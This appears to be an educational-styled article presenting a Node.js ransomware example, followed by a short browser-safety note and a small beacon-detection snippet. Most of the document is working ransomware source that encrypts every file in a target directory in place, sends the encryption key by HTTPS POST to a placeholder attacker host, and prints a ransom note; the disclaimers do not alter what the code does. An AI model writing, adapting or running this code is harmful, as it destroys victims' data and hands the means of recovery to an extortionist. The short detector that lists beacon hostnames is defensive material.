Ransomware attacks are one of the most destructive and malicious types of cyber threats, often resulting in significant financial losses and personal data theft. It is important to understand the mechanisms of ransomware attacks in order to protect yourself and your systems from these malicious threats.

This JavaScript code provides a simplified example of a ransomware attack and its underlying techniques. It is intended for educational and ethical hacking purposes only, and should not be used for any illegal or unethical activities. It is important to always abide by the law and use technology responsibly and ethically to promote positive outcomes for society.

## Example
```javascript
// Ransomware code (for demonstration purposes only)
var fs = require('fs');
var crypto = require('crypto');
var https = require('https');

// Directory to target for file encryption
var targetDirectory = '/user/files';

// Generate encryption key
var encryptionKey = crypto.randomBytes(32).toString('hex');

// Read all files in the target directory
fs.readdirSync(targetDirectory).forEach(file => {
  // Skip directories
  if (fs.lstatSync(file).isDirectory()) return;

  // Read file data
  var data = fs.readFileSync(file);

  // Encrypt file data with encryption key
  var cipher = crypto.createCipher('aes-256-cbc', encryptionKey);
  var encryptedData = cipher.update(data, 'utf8', 'hex') + cipher.final('hex');

  // Write encrypted data back to file
  fs.writeFileSync(file, encryptedData);
});

// Send beacon with encryption key (for demonstration purposes only)
var beaconData = JSON.stringify({ key: encryptionKey });
var options = {
  hostname: 'malicious.server.com',
  port: 443,
  path: '/beacon',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': beaconData.length
  }
};

var req = https.request(options, res => {
  console.log(`Beacon sent with status code: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(`Error sending beacon: ${error}`);
});

req.write(beaconData);
req.end();

// Display ransom note to user
var ransomNote = `
Your files have been encrypted!
Contact us at malicious@server.com to get the decryption key.
`;

console.log(ransomNote);
```

## Note
As technology continues to advance, it's more important than ever to protect ourselves and our systems from malicious attacks. With the rise of dangerous JavaScript techniques that can be executed through the browser, it's crucial to take proactive measures to safeguard your browsing experience. By utilizing browser add-ons such as NoScript and Privacy Badger, you can protect yourself from potential threats and enjoy a safer, more secure online experience. Remember, it's not just about protecting yourself - it's about promoting a culture of responsible technology use that benefits society as a whole.

## Detecting Fallback and Beaconing Mechanisms
Ransomware often includes fallback mechanisms and beaconing to ensure it can still operate if initial commands fail. Here are some examples to detect such activities:

```javascript
// Detect beaconing attempts
var detectBeaconing = function() {
  var knownBeacons = ['malicious.server.com', 'another.malicious.com'];
  var networkRequests = getNetworkRequests(); // Hypothetical function to get network requests

  networkRequests.forEach(request => {
    if (knownBeacons.includes(request.hostname)) {
      console.warn(`Potential beacon detected to: ${request.hostname}`);
    }
  });
};

detectBeaconing();
```
